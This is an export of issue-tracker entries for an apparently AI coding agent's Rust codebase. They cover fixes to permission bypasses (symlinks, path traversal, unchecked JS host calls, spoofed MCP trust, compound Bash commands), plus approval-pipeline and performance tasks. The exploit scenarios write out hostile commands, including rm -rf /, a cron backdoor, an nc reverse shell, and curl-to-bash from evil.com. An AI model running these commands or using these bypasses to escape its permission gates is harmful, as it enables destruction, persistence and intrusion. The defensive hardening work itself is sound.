title: SECURITY: Symlink-based permission bypass: permission check on original path, write to resolved target
description:
## What is wrong
The write tool checks permissions on the user-provided path (which might be a symlink) but then passes that path to atomic_write, which resolves the symlink and writes to the target. If the permission system is designed to restrict access based on the original path, an attacker can bypass this by using symlinks. The permission check occurs at line 72 on 'expanded' path, but atomic_write at line 98 resolves symlinks and writes to the real target.

## Exploit / failure scenario
User has permission to write to /tmp/safe_link but not to /etc/passwd. They create /tmp/safe_link -> /etc/passwd. Tool checks permission for /tmp/safe_link (allowed), then writes to /etc/passwd (restricted file). Attacker successfully bypasses permission system.

## Fix
Resolve symlinks before permission check: (1) Pass the resolved canonical path to check_perm_path, or (2) Add symlink resolution to check_perm_path itself, or (3) Document that permission checks should be bypassed and symlinks are intentionally followed

## Verification
Create a symlink from an allowed path to a restricted file, attempt to write, verify that either: (a) permission is denied on the restricted target, or (b) symlink traversal is explicitly documented and accepted

## Location
/Users/ahrens/projects/mini-agent/src/agent/tools/write.rs:72
close_reason: Implemented: resolve the atomic-write symlink target before permission checking and add a regression test that prevents writes through an allowed link to a restricted target

title: SECURITY: Path traversal vulnerability in write_file
description:
## What is wrong
write_file accepts arbitrary paths with no validation. Can write to any file on the filesystem including system configuration files, binaries, or other users' data.

## Exploit / failure scenario
JS code: write_file('/tmp/malicious.sh', '#!/bin/bash\nrm -rf /') or write_file('/etc/cron.d/backdoor', 'malicious cron job') to establish persistence or cause damage.

## Fix
Call check_perm_path(permission, ask_tx, 'write', &path) before executing the write, using the same permission checker logic as the write tool in tools/write.rs.

## Verification
Verify that (1) writing to /etc/passwd from JS is denied; (2) writing outside project directory prompts for external directory permission; (3) writing within project directory works when allowed; (4) symlink traversal attacks fail.

## Location
src/extras/js/host.rs:21
close_reason: Implemented: permission-gated JS writes with resolved target checks and traversal coverage

title: SECURITY: Permission bypass: host globals execute without check_perm
description:
## What is wrong
The host functions (read_file, write_file, spawn) are registered as QuickJS closures without access to the permission system. Once JS code is approved to run via check_perm in tool.rs:54, the closures execute with unrestricted access to filesystem and process operations. This completely bypasses the permission framework's intent to gate each tool action.

## Exploit / failure scenario
User approves 'js' tool execution, then JS code calls read_file('/etc/passwd') without any permission prompt or check. The JsTool only checks if JS execution is allowed, not what files/commands the JS code will access.

## Fix
Refactor host function makers to accept permission checker context. Thread Arc<Mutex<PermCheck>> through register_host_globals, and call check_perm for each operation: read_file should call check_perm_path(permission, ask_tx, 'read', path), write_file should call check_perm_path for 'write', spawn should call check_perm for 'bash' with the command string.

## Verification
Verify that (1) attempting to read a denied file from JS code now prompts for permission; (2) if user denies, the read fails with permission error; (3) same for write and spawn operations; (4) doom-loop detection works for repeated JS-initiated operations.

## Location
src/extras/js/host.rs:15
close_reason: Implemented: permission-gated JS read/write/spawn host calls through read/write/bash policies, including full spawn command checks and denial/doom-loop regressions

title: SECURITY: Path traversal vulnerability in read_file
description:
## What is wrong
read_file accepts arbitrary paths with no validation, normalization, or allowlist checking. The path is passed directly to std::fs::read_to_string without any checks for directory traversal (../, symlinks, etc.) or external path constraints.

## Exploit / failure scenario
JS code: read_file('../../../../etc/passwd') or read_file('/etc/shadow') or following symlinks to read system files outside the intended directory.

## Fix
Call check_perm_path(permission, ask_tx, 'read', &path) before executing the read. The permission checker already implements canonicalization and external path detection in check_path (checker.rs:405-439). Alternatively, validate that the resolved absolute path is within an allowed directory.

## Verification
Verify that (1) reading /etc/passwd from JS is denied or prompts; (2) symlink traversal is blocked; (3) relative path traversal like '../../../secret.txt' is blocked; (4) reading from project directory works when allowed.

## Location
src/extras/js/host.rs:16
close_reason: Implemented: verified JS read_file uses check_perm_path and added regressions for allowed workspace reads, absolute escapes, relative parent traversal, and symlink escapes

title: SECURITY: spawn() bypasses sandbox wrapper and permission checks
description:
## What is wrong
spawn() uses std::process::Command directly without: (1) wrap_command() sandboxing from sandbox.rs (other code uses this for all subprocess execution), (2) check_perm for the bash tool, (3) input validation or escaping. The BashTool in tools/bash.rs calls check_perm and wrap_command; spawn() does neither.

## Exploit / failure scenario
JS code: spawn('rm', ['-rf', '/home/user/important']) to delete files, or spawn('nc', ['-l', '-p', '9999', '-e', '/bin/bash']) to open a reverse shell, or spawn('curl', ['https://evil.com/backdoor.sh', '|', 'bash']) (note: args is Vec not shell, so this particular example fails, but spawn('bash', ['-c', 'curl ...']) works).

## Fix
Before executing Command::new, call check_perm(permission, ask_tx, 'bash', &cmd) to gate execution. Wrap the command construction in sandbox.rs::Sandbox::wrap_command() if sandboxing is available. Consider whether full command+args should be checked as a unit or separately.

## Verification
Verify that (1) executing spawn('rm', ...) from JS is denied or prompts for bash permission; (2) restricted commands are blocked; (3) spawn is wrapped in sandbox if available; (4) stdout/stderr capture still works after sandboxing.

## Location
src/extras/js/host.rs:27
close_reason: Implemented: spawn checks the full command through bash permissions, executes via Sandbox::wrap_command, and has regression coverage for denial and output capture

title: [AUDIT] Verify installer artifact checksums before extraction
description:
## Problem / security impact
`install.sh:75-108` downloads and extracts executable release archives without verifying an authenticated exact-artifact checksum. A modified download or wrong-platform archive can become arbitrary code execution.

## Scope / files
- `install.sh:75-108`
- release checksum manifest generation in `.github/workflows/release.yml`
- installer test fixtures/scripts and installation documentation

## Required implementation
Download the exact checksum for the selected version/platform/archive over the same trusted release channel, parse it strictly, verify before extraction, and fail closed on missing, malformed, duplicate, mismatched, or wrong-filename entries. Use an available SHA-256 implementation with explicit platform handling. Do not accept a checksum embedded only inside the unverified archive. Clean temporary downloads on all failures and never execute/extract a mismatched artifact.

## Acceptance criteria
- A valid archive/checksum installs normally.
- One-byte modification, missing manifest, malformed hash, duplicate entry, wrong filename/platform, and network failure abort before extraction.
- The verified filename is exactly the archive extracted.
- Failure messages contain no secrets and leave no installed binary/partial extraction.

## Validation
Run `bash scripts/test-install-checksums.sh` using a local fake release server/fixtures; no public network dependency. Cases must include valid, modified, absent, malformed, duplicate, and wrong-platform checksums and assert extraction sentinel files are absent on failure. Run `shellcheck install.sh` if available. In release CI, install one real artifact through `install.sh` before publication.
acceptance_criteria: install.sh strictly verifies the exact selected archive's SHA-256 before extraction and fails closed for absent, malformed, mismatched, duplicate, or wrong-platform checksums.

A one-word assistant reply is the success criterion. MCP teardown noise after that reply is benign; teardown noise without a valid reply is not a pass. If credentials or network access are unavailable, record the smoke as blocked rather than claiming full verification.

Added a real-installer missing checksum download regression and refreshed the canonical four-file fixture. Final installed debug JS and OpenRouter smokes passed.

title: [AUDIT] Implement the JS permission bridge lifecycle with deadlines and request identity
description:
## Problem / security impact
JS host globals send synchronous permission requests from a dedicated OS thread, but no complete Tokio-side bridge lifecycle is specified. Blocking receives can hang forever; dropped channels and stale replies can kill or cross-contaminate JS calls; shutdown can leak the engine thread.

## Scope / files
- `src/extras/js/types.rs` request/response identity
- `src/extras/js/tool.rs` channel ownership and cancellation
- `src/extras/js/engine.rs` JS-thread request lifecycle
- `src/agent/builder.rs` or startup owner for the async receiver task
- JS permission bridge tests

## Required implementation
Create one owner for the async permission receiver task and define startup/shutdown with `JsTool`. Every request carries a unique ID and bounded deadline; every response is matched to exactly that ID. Propagate Ask/Allow/Deny, permission errors, cancellation, channel closure, and timeout back as typed JS errors without panic. Discard stale/late responses and prevent reuse across invocations. Dropping the tool must stop the receiver and JS thread or otherwise provide a tested process-lifetime owner. Do not block a Tokio worker thread while waiting on synchronous JS work.

## Acceptance criteria
- No permission wait is unbounded.
- Dropped senders/receivers, permission backend failure, cancellation, and timeout return deterministic errors.
- A late response for request N cannot satisfy N+1.
- Shutdown leaves no permission task or JS thread running and does not panic.
- read_file, write_file, spawn, and later fetch share this bridge rather than independent ad-hoc channels.

## Validation
Run `cargo test --features js js_permission_bridge`. Tests must cover allow, deny, ask/approval, timeout, dropped request sender, dropped response receiver, cancellation, late reply, out-of-order reply, repeated calls, and tool drop. Assert no cross-request leakage and bounded completion time. Then run `cargo test --features js` and `cargo test`.
acceptance_criteria: The JS permission bridge has owned startup/shutdown, unique request IDs, finite waits, cancellation/channel error handling, and no stale reply leakage.
close_reason: Implemented: owned JS permission bridge with correlated deadlines, cancellation-safe shutdown, typed failures, and lifecycle/adversarial tests

title: [AUDIT] Bind MCP read-only exemptions to trusted server identity and exact tools
description:
## Problem / security impact
The permission checker grants read-only exemptions based on user-visible MCP server/tool names. A user-defined MCP server can impersonate a trusted name such as `Context7`, or use a prefix variant, and inherit approval-free execution. Names are configuration, not trust identities.

## Scope / files
- `src/permission/checker.rs:383-387,609-614`
- `src/extras/mcp/tool.rs:50-72`
- `src/config/load.rs:453-505`
- MCP configuration/runtime identity types and adjacent tests

## Required implementation
Introduce an immutable trust marker produced only for built-in MCP registrations, not deserialized from user config. Couple exemptions to that trusted identity plus an exact, enumerated tool-name allowlist. User-defined servers remain subject to normal permission rules even when display name, normalized name, endpoint, or tool prefix resembles a built-in. Avoid string-prefix, case-folded alias, or display-name checks. Preserve the trusted identity through tool construction without exposing a config knob that can forge it. Document which exact built-in tools are exempt and why.

## Acceptance criteria
- A custom server named `Context7`, `context7`, `Context7/resolve-library-id`, or a prefix/suffix variant receives no exemption.
- Only the intended immutable built-in registration plus an exact tool name is exempt.
- Unknown tools on a trusted server still ask/deny.
- Reconfiguration of a built-in endpoint cannot silently preserve trust unless that behavior is explicitly designed and tested.

## Validation
Run `cargo test mcp_read_only_exemption` and `cargo test permission::`; both must pass. Tests must construct a trusted built-in, an untrusted server with the same display name, prefix/case variants, and an unexpected tool on the trusted server. Expected result: exactly the built-in identity/exact-tool pairs bypass prompting.
acceptance_criteria: Only immutable built-in MCP identities and exact allowlisted tools receive read-only exemptions; spoofed names and tool variants do not.
close_reason: Implemented: bound MCP read-only exemptions to immutable built-in identities and exact tool allowlists; fixed the const string matcher verification failure

title: [AUDIT] Harden Bash authorization against compound shell execution
description:
## Problem / security impact
`src/agent/tools/bash.rs` derives permission decisions from an incomplete view of a Bash script. An apparently allowed command can contain command substitutions, backticks, heredocs, process substitutions, pipelines, redirects, or background jobs that execute unreviewed programs. For example, a broad `echo *` allow rule must not authorize `echo "$(curl attacker | bash)"`.

## Scope / files
- `src/agent/tools/bash.rs`, especially command normalization and the check before process launch
- `src/permission/checker.rs` Bash rule matching
- Bash permission tests adjacent to those modules
- Permission documentation if the chosen model changes user-visible rule semantics

## Required implementation
Choose and document exactly one fail-closed model: (A) parse the complete Bash AST and authorize every executable and redirection node, including nested substitutions; or (B) treat the complete script as an opaque permission key and authorize only an exact complete-script rule. Do not split with ad-hoc tokenization. Parsing or classification failure must return Ask/Deny, never Allowed. Apply the decision before any process starts and keep the executable script identical to what was authorized. Cover `$()`, backticks, heredocs, here-strings, `<()`/`>()`, pipelines, redirects, command lists, subshells, and `&` jobs. Do not silently reinterpret existing broad rules as authorizing nested execution.

## Acceptance criteria
- `echo *` cannot authorize `echo "$(curl https://example.invalid/x | bash)"`, backtick variants, or process-substitution variants.
- Every executable and file redirection is authorized under model A, or only an exact normalized full script can be allowed under model B.
- Malformed/unsupported shell syntax asks or denies before launch.
- Simple existing commands retain documented behavior.
- Tests assert no child process starts when any nested operation is denied.

## Validation
Run `cargo test bash_compound_command_permission` and `cargo test permission::`; both must pass. Add table-driven cases for substitutions, heredocs, process substitutions, pipelines, redirects, subshells, background jobs, syntax errors, and a simple allowed command. Run `cargo test` for the regression suite. Expected result: all bypass payloads are Ask/Deny and the sentinel nested command is never executed.
acceptance_criteria: Compound Bash syntax cannot execute an unreviewed nested command; parsing failures fail closed; targeted and full cargo tests pass.
close_reason: Implemented: switched Bash authorization to an exact opaque full-script key, removed ad-hoc splitting, kept broad ask/deny safeguards, added compound-command no-child regression coverage, and documented the model

title: [D2] Implement sole evaluator and human approval service into canary
description:
## Outcome
Implement the sole service that evaluates a leased proposal and, after complete revalidation plus authenticated human approval, admits the unchanged verified revision into durable non-retrievable canary.

## Owned files and boundaries
- `src/extras/js/skills/admission.rs`: lease worker, gate orchestration, retry classification/backoff, review model, authenticated approval and transaction call.
- `src/extras/js/tests/skill_admission_gate.rs`: every evaluator/approval/concurrency/restart/publication path.
- Minimal human review adapter that displays the exact bounded artifact/report; it cannot call low-level transitions directly.

Consume queue/schema from `2e4`, evaluator from `51o`/`y8n`, embedder from `zea`, and private transaction from `j6j`.

## Required implementation
1. Claim/renew a lease, reload artifact/predecessor, recompute full identity/capability, and run embedded exact-boolean, mutation, inherited, hidden held-out, no-effect fake, export, capability, duplicate, and model-versioned embedding gates.
2. Persist a versioned report bound to artifact/predecessor/suites/verifier/fake/model. Retry bounded infrastructure errors; deterministic failures atomically reject proposal+revision.
3. Human review shows full ID/source/metadata/exports/capability and bounded gate/version summaries. Require explicit authenticated approve/deny; model output cannot approve.
4. Reacquire and revalidate artifact/report/suites/capability/versions immediately before private transaction into canary and desired generation.
5. Denial/cancel/timeout, missing suite/report, stale/tamper, capability escalation, lease/store/index failure, concurrent approval, or changed bytes cannot enter canary. There is no active transition.

## Non-goals
Do not activate or route canary, auto-approve, expose held-out answers, call real verifier hosts, mutate artifact bytes, or bypass `j6j` transactions.

## Acceptance Criteria
- Every gate executes against reloaded persisted immutable bytes and exact versions; deterministic failure is terminal/idempotent and retryable infrastructure failure remains safely queued.
- Only explicit authenticated approval of the displayed unchanged report can create exactly one audited durable canary.
- Every denial/error/stale/tamper/concurrency/publication path creates no canary/active visibility and cannot panic.
- Successful canary remains absent from retrieval, manifests, turn bundles, and execution until Phase 5.

## Verification
Run:
```bash
cargo test --features js,skills skill_admission_gate
cargo test --features js,skills skill_admission_review
cargo test --features js,skills skill_admission_concurrency
cargo test --features js,skills
cargo install --path . --debug
```
Fixtures must cover every gate/fake tier, missing/failing suites, terminal rejection/reproposal, retry/crash/lease recovery, review mutation, concurrent approvals, deny/cancel/timeout, all capability manifests, model/generation/store failures, success with fake authenticated approver, and explicit non-retrievability.

title: [D2] Implement private lifecycle transactions for verified, canary, rejection, and approval states
description:
## Outcome
Implement private optimistic lifecycle transactions for evaluating, verified, awaiting-approval, terminal rejected, and non-retrievable canary states so raw persistence cannot bypass verification/human intent.

## Owned files and boundaries
- `src/extras/js/skills/admission_store.rs` or the established store submodule: private typed Phase 4 transition transactions.
- `src/extras/js/skills/store.rs`: minimal internal hooks/schema access only.
- `src/extras/js/tests/skill_store_pending_lifecycle.rs`: state, tamper, concurrency, failure, and symbol-visibility fixtures.

Only `mini-agent-57s` calls these operations. Phase 5 extends lifecycle separately; no public CRUD activates/canaries revisions.

## Required implementation
1. Reload and re-hash canonical artifact/capability before every transition; use optimistic row/report/generation versions and exact proposal/revision binding.
2. Permit only pending/evaluating to verified or terminal rejected, verified to awaiting approval, and explicit approved awaiting state to canary.
3. Deterministic rejection atomically marks both proposal and revision `rejected`, stores versioned report/reason, and makes same-ID reproposal return it idempotently. Rejected never transitions/indexes.
4. Canary approval records authenticated audit and desired generation but never marks active or retrievable.
5. Missing/stale/tampered/duplicate/lock/database/statement failure leaves lifecycle/report/generation unchanged; reject touches only named proposal+revision.
6. Keep low-level transitions private with typed errors and no unwrap/panic.

## Non-goals
Do not evaluate tests, authenticate/show approval UI, decide retryability, activate/index canary, mutate artifact bytes, or expose raw transition SQL publicly.

## Acceptance Criteria
- Compile/symbol tests prove only the sole admission service can invoke low-level transitions and no public API reaches active.
- Every legal/illegal/stale/rejected transition has deterministic results with identity/report revalidation.
- Failure injection at each SQL/generation step rolls back all rows and makes retries idempotent.
- Successful approval produces audited durable canary that remains retrieval-ineligible.

title: [D2] Permission-gate and resource-bound JS spawn/console host globals
description:
## Problem / security impact
The proposed JS `spawn()` blocks indefinitely on permission, can capture unbounded output, and may run unsandboxed when a backend is missing. This creates authorization bypass, memory exhaustion, hangs, and descendant-process leaks once registered.

## Scope / files
- `src/extras/js/host.rs` `SpawnContext`, `make_spawn`, console registration
- `src/extras/js/types.rs` permission and result types
- `src/sandbox.rs` command wrapping/process control
- JS host tests

## Required implementation
Send a `js/spawn` permission request through the shared bridge using a deterministic key that represents the exact executable plus ordered argument vector; the authorized vector must be the one passed to `std::process::Command`, with no shell interpolation. Apply finite permission-response and complete host-call/process deadlines. Route every launch through `Sandbox::wrap_command` and the fail-closed requested/unavailable policy; no direct fallback command. Drain stdout and stderr concurrently with independent and combined byte caps. On cancellation, timeout, bridge closure, or cap breach, kill/reap the complete process tree and ignore stale replies. Return structured code/stdout/stderr plus explicit timeout/truncation state. Bound per-step `console.log` bytes/messages and apply deterministic truncation or error behavior. Deny/Ask failure must start no child.

## Acceptance criteria
- Permission is bound to the exact argument vector; metacharacters remain literal arguments and cannot create shell execution.
- Requested-but-unavailable sandbox prevents launch absent separate explicit unsandboxed consent.
- Permission wait, process runtime, output, and console logging are finite and bounded.
- stdout/stderr floods cannot deadlock; timeout/cancellation leaves no descendants.
- Deny, failed Ask, timeout, cancellation, and channel closure return JS errors without panic; later JS calls still work.

## Validation
Run `cargo test --features js js_spawn_host_security`, `cargo test --features js,sandbox js_spawn_host_security`, and `cargo test --features js`. Tests cover allow/deny/Ask, argument metacharacters, permission timeout/closure/late reply, unavailable sandbox, infinite/forked child, stdout-only/stderr-only/mixed floods, output truncation, console cap, cancellation, and recovery. Run `cargo test` for the non-JS build.
acceptance_criteria: JS spawn authorizes the exact argument vector, always honors fail-closed sandbox policy, has finite permission/process deadlines and bounded concurrent output, cleans descendants, and console output is bounded.
notes:

title: [D2] Permission-gate and safely bound JS read_file/write_file globals
description:
## Problem / security impact
The current bead explicitly permits direct `std::fs` reads/writes without a permission channel. Once `JsTool` is registered, arbitrary model-generated JS could read or overwrite any path available to the process. A Phase 2 allow-list cannot retroactively make an exposed Phase 1 primitive safe.

## Scope / files
- `src/extras/js/host.rs` read/write host factories and registration
- `src/extras/js/types.rs` permission request usage
- `src/permission/checker.rs` rules for `js/read_file` and `js/write_file`
- `ARCHITECTURE.md:89-121`
- `docs/specs/phase-1-js-engine.md:228-305`
- JS host tests

## Required implementation
Route every call through the owned JS permission bridge. For reads, authorize tool `js/read_file` with the exact normalized/canonical target actually opened. For writes, authorize `js/write_file` with the exact final target; for nonexistent targets, canonicalize the nearest existing parent, validate a single relative basename/path without `..`, and bind approval to the derived final path. Apply workspace/root containment using path components, not string prefixes. Define final/parent symlink policy and use race-resistant no-follow operations; revalidate immediately before mutation. Phase 2 allow-lists are an additional restriction, never a replacement for permission. Add finite host-call deadlines and read/write byte caps; reject non-UTF-8 or oversized content with typed JS errors. Handle Allow, Deny, Ask, timeout, cancellation, and channel closure without panic or hanging. Do not expose unrestricted direct `std::fs` closures.

## Acceptance criteria
- No file operation occurs before permission succeeds for its exact resolved path.
- Permission for `/safe/a` cannot authorize `/safe/a/../secret`, `/safe-a`, a symlink escape, or a later target swap.
- Nonexistent write targets are resolved through a canonical approved parent and revalidated at mutation.
- Deny/failed Ask/timeout/channel closure returns a JS error and performs no I/O.
- Oversized reads/writes are rejected within configured limits.
- Phase 1 remains safe without `sandbox`; Phase 2 allow-lists can only narrow access.

## Validation
Run `cargo test --features js js_file_host_permissions` and `cargo test --features js`. Tests cover allowed read/write, deny, Ask approval/denial, bridge timeout/closure, traversal, sibling-prefix paths, final and parent symlinks, nonexistent targets, target swap, oversized input/output, and post-error JS-thread survival. Run `cargo test` to verify the non-JS build.
acceptance_criteria: Every JS file read/write is authorized against the exact resolved path, remains inside configured roots without symlink/TOCTOU escape, is resource-bounded, and handles every permission outcome without panic.
close_reason: Implemented: permission-gated canonical file targets, bounded stable reads, race-resistant atomic writes, JS file permission aliases, lifecycle/error coverage, and architecture/spec tests

title: [D2] Define correlated, deadline-aware JS permission channel types
description:
## Problem / security impact
The current `PermRequest`/`PermResponse` sketch has no correlation ID, deadline, or complete error outcomes. A late response can satisfy the wrong host call, and channel failures can become indefinite waits or panics.

title: Group-commit JS effect audit completions: halve F_FULLFSYNC per brokered effect
description:
- Priority: P1
- Dimension: io
- Confidence: medium
- WHAT: Every effect, including read-only `read_file`/`list_dir`/`glob`/`grep`/`scratch_get`, performs two `File::sync_all()` calls, which on macOS is `fcntl(F_FULLFSYNC)` (2-10 ms each on Apple internal SSDs, more on external drives; ~0.5-2 ms fdatasync on Linux SSD). A step with 20 reads pays ~40 full syncs (~100-400 ms on macOS); the 256-effect cap allows 512 syncs (~1-5 s) of pure disk-barrier latency inside the 30 s step budget. Warm IPC itself is 0.8 ms p95 (docs/benchmarks/2026-09-09-macos-worker-startup-overlap.md), so the audit barrier dominates effect latency by an order of magnitude. SPEC NOTE: delivered amendment 5 explicitly permits group commit ("Audit records within one step may be group-committed as long as intent still precedes the first byte of the effect", docs/specs/phase-6-brokered-js-runtime.md:1410-1411) but the older numbered ordering text at :620-621 (steps 7/8: "append and sync a bounded completion ... only then return") still says sync-per-completion; the implementer must reconcile both sentences in the spec in the same change, not pick one silently.
- WHERE: src/extras/js/broker.rs:1296-1395 (`InvocationBroker::dispatch`, intent append under `spawn_blocking_scoped`) and 1397-1427 (completion append); src/extras/js/audit.rs:913-944 `append_effect_unpoisoned` (`self.append_encoded(&stored.record_hash, &encoded)?; self.sync_file()?;`) and audit.rs:1567-1572 `fn sync_file(...) { ... file.sync_all() }`; `append_completion` audit.rs:622-648 routes through `append_effect`.
- HOW: In `EffectAudit` add `pending_sync: bool` and `pub(crate) fn sync_pending(&mut self) -> Result<(), AuditError>`. Make `append_completion` append without syncing and set `pending_sync`. Keep every existing sync point unchanged in ordering: `append_intent`, `append_denial`, `rotate`, and `open` already end with `sync_file`, so the pending completion rides the next intent's fsync (one barrier covers completion N and intent N+1). Add one terminal flush: in `JsTool::call` (src/extras/js/tool.rs:1222-1235) after `execution.await`, run `sync_pending` via `spawn_blocking_scoped` before `render_step_result`; on failure return the same closed audit error path as today's completion-sync failure (fail closed, retire invocation). Also flush in `InvocationBroker::reconcile_interrupted_effect` and before `erase_authority(Terminal)`. Crash window semantics stay truthful: an unsynced completion lost at crash leaves the intent active and `recover_unknown_outcomes` (audit.rs:883-898) records `outcome_unknown`. Intent-before-first-byte is untouched. Touches no canonical invariant 1-7; update the spec sentence at :620-621 to cite amendment 5. title: Point every CI `cargo install --path .` at the cached target directory
description:
- Priority: P1
- Dimension: ci-cost
- Confidence: high
- WHAT: `cargo install --path .` builds into a fresh temporary target directory unless `CARGO_TARGET_DIR`/`--target-dir` is set, so nine CI jobs compile all ~380-500 dependency crates (at `opt-level = 1`) from scratch, ignoring the rust-cache that the same job just restored, and in several jobs *after* an already-complete `cargo test` build of the same feature set (harness-regression runs `cargo test` then `cargo install --features skills`; linux-sandbox-policy and the macOS gate run `cargo test --features js` then `cargo install --features js`). Only the Windows worker gate already sets `CARGO_TARGET_DIR` (ci.yml:2365). Estimated waste: ~6-10 min Linux, 10-20 min macOS/Windows per affected job per push.
- WHERE: `.github/workflows/ci.yml` lines 373 (`harness-regression`), 448 (`vscode`), 1356 (`linux-sandbox-policy`), 1529 and 1618 (`macos-worker-containment-gate`), 1829 (`windows-general-sandbox-policy`), 1968 (`windows-worker-containment-gate`), 3006 (`platform-path-install-smoke`), 3242 (`install`). Leave 3341 (`package`: deliberately builds a source candidate "in isolation" from `$tmpdir`) and release.yml alone.
- HOW: add `--target-dir "${{ github.workspace }}/target"` (bash) / `--target-dir "$env:GITHUB_WORKSPACE/target"` (pwsh) to each listed `cargo install` line, or add a job-level `env: CARGO_TARGET_DIR: ${{ github.workspace }}/target` on those nine jobs (mirrors ci.yml:2365). title: Subagent report repair runs in a fresh empty conversation and cannot restate the child's findings
description:
Source: feedback A3. Verified on HEAD.

Root cause: src/extras/subagents/task_tool.rs:1179-1212 — the comment says "the same child is asked to restate its own findings", but the repair calls `repair_agent.run_subagent(report_repair_prompt(response,…))` (REPORT_REPAIR_MAX_TURNS=1 at :2309, prompt at :2313-2340) and run_subagent always starts with `stream_chat(p, Vec::<Message>::new())` (src/agent/runner.rs:4870). The repair model sees only the quoted narration (capped at max_report_bytes/2), never the tool results, so it returns "No findings were established".

Fix: run the repair as a continuation of the child's own conversation (history incl. tool results), tools disabled, one turn. Fix the misleading comment. Related: turn-budget write-up bead (shares the need to keep child history).

title: Subagent that exhausts its turn budget returns narration only; no tool-free write-up turn
description:
Source: feedback A2. Verified on HEAD.

Symptom: medium/large delegations end `[partial: turn budget exhausted]`; repair (see sibling bead on empty-history repair) then reports no evidence-backed findings. Measured success: GLM 6/19, Sonnet 4/7, Opus 1/13 (Opus 8/9 even with narrow briefs).

Root cause: src/agent/runner.rs `run_subagent` (:4851) only accumulates streamed assistant text (`full_response.push_str`, :4909; FinalResponse overwrites at :4926). title: SECURITY: --api-key for the session provider is forwarded to cross-provider persona children (vendor key reaches third-party base_url)
description:
WHAT: A `--api-key` given for the session's own provider is forwarded to every persona child that switches provider via a quick-model alias, including isolated custom providers with a third-party base_url. Starting `mini-agent --api-key <anthropic key>` with a persona whose `model:` alias points at `[custom_providers.glm]` (base_url = some GLM gateway) sends the Anthropic key to that gateway. This contradicts the documented isolation guarantee (docs/agent/CONFIG.md:783: "Custom providers are isolated ... so a vendor key is never sent to a third-party base_url"). Found 2026-10-19 while building the designer -> implementer -> reviewer pipeline example (branch feat/persona-pipeline).

WHERE: src/extras/subagents/task_tool.rs:509-526 (resolve_persona_runtime: `create_client(&quick_model.provider, api_key, ...)` with the parent's CLI key), src/extras/subagents/mod.rs:24-26 (`api_key` "retained only so a persona quick-model can select another provider with the same explicit credential semantics as startup"), src/provider.rs create_client / credential resolution, docs/agent/CONFIG.md:346, 735, 783, ~1409-1430, docs/agent/SUBAGENTS.md pipeline gotchas.

HOW: Scope the CLI key to the provider it was given for. In resolve_persona_runtime pass `api_key` only when `quick_model.provider == provider_name` (same provider as the session); for any other provider pass None so the child resolves only that provider's own designated credential (api_key_env / api_keys[alias] / its vendor env var per the existing isolation rules). Keep the documented precedence for the parent provider unchanged. Apply the same rule anywhere else a child/auxiliary client is built for a different provider from the CLI key (grep create_client call sites: advisor, distill, goal judge, ACP provider cache, session title model). Update CONFIG.md/SUBAGENTS.md to state that --api-key applies only to the session provider.

VERIFY: tests: (1) session provider anthropic with CLI key K, persona alias on custom provider glm with api_key_env set -> glm client uses the env key, never K; (2) glm with no own credential -> resolution fails closed ("could not initialize provider 'glm'"), never falls back to K; (3) persona alias on the SAME provider still receives K. Run extras::subagents::task_tool persona_pipeline plus provider credential tests; review every other create_client call site for the same pattern.

Persona children (task_tool resolve_persona_runtime_with), subagent resolve_config, advisor model_client/select_model, /model, /provider, prompt remap, session import/restore, switch_client, distill, ACP clients all pass None for other providers. Goal judge and session title already passed None. | Notes: startup.rs:1311 and diagnostics left as-is (startup provider). distill uses resolve_provider (not quick-model) so --quick-model to another provider plus --api-key now needs that provider's own key. title: Performance review 2026-10-19: runtime hot paths beyond the TUI, persistence, sandbox, JS, skills, protocols, and compile time
description:
Performance review of the whole code base on 2026-10-19 (main at b56d7a74), following the 2026-10-15 TUI review (epic mini-agent-cttyn, all 66 children closed). Question asked: beyond the TUI, where does mini-agent spend time it does not need to — per token, per keystroke, per tool call, per turn, per session save, per subprocess, at startup, and at compile time — and should the crate be split to speed up compilation?

Method: own measurement of compile time (incremental floor 16 s wall; non-incremental crate build 73 s of which the test harness is 63 s; 43 of 61 modules form one strongly-connected component, minimum feedback arc set ≈383 import sites / 91 module pairs; conclusion: do not split the crate for compile speed, see the compile-time children), plus eleven parallel read-only area reviews (agent runner, built-in tools, provider/HTTP, session/context/fs, startup/config, sandbox/permission, JS runtime core, JS skills store, MCP/ACP/LSP/hooks, subagents/goal/misc extras, UI post-cttyn). Every P1 was re-verified against the source by the coordinating session; 13 overlapping findings were merged. 123 children: P1 9, P2 34, P3 60, P4 20. Label perf-2026-10-19 with area:<area> sub-labels (compile 4, extras 9, js 11, protocols 15, provider 5, runner 8, sandbox 14, session 14, skills 11, startup 9, tools 16, ui 7). Each child has WHAT / WHERE (file:line at b56d7a74) / HOT PATH / EXTRACT / HOW / VERIFY.

Headline causes (the P1s):
1. Every Anthropic model call, tool call and tool result clones and re-serializes the whole native history (agent/native_capture.rs) — O(n²) over a session.
2. Every model call re-reads, re-parses, re-hashes and fsyncs the whole usage ledger before tools run (spend/ledger.rs flush_rows).
3. Every bound edit/write runs file_checkpoints::prepare inline on the executor: blob-dir rescan + two F_FULLFSYNCs.
4. Every JS effect pays two synchronous fsyncs on the executor under the audit mutex (extras/js/audit.rs).
5. Anthropic sessions bypass the deferred writer: the turn-end save is still synchronous on the UI task (cttyn.60 incomplete).
6. With default features, every user turn re-discovers, re-hashes and re-materializes every skill package with fsyncs, and Package::authorized re-hashes every package file on every completion call.
7. ACP spawns, initializes and shuts down every configured MCP server on every prompt.
8. converge_legacy_artifacts SHA-256s whole sessions/tool-outputs/logs trees on every start when no migration marker exists (which is the common case).

Recurring patterns behind the P2/P3s: WorkspaceBinding::validate / canonicalize storms repeated per operation (tools, wrap_command, bwrap, seatbelt, git runner, subagent pool, permission checker); whole-session JSON serialization used as a byte counter; reqwest clients built per request; synchronous std::fs and fsync on the async executor; per-keystroke config/trust-store re-reads on the UI task; per-frame deep clones for the statusline.

Security caveats carried in every child: never weaken the Phase 6 invariants or the fail-closed sandbox/permission/MCP-revocation checks — make them cheaper (stat fingerprints, memoize per operation, hoist out of loops) or move them off the UI/executor task, never skip them.

title: Turn-end session save is synchronous on the UI task with two fsyncs
description:
WHAT: persist_session_if_settled -> save_session serializes the whole session (bounded 8 MiB JSON) and publish_legacy_owned -> private_atomic_write_checked_sync writes a temp file, file.sync_all() (F_FULLFSYNC on macOS), rename, then parent-dir sync_all, all on the event loop at handle_agent_done, Error, question park, apply_session_title and settle_session_title. Mid-turn ToolCall/ToolResult saves are already no-ops (pending_turn is Some), so the whole cost lands exactly when the user regains the prompt: 10-100+ ms stutter on multi-MB sessions.
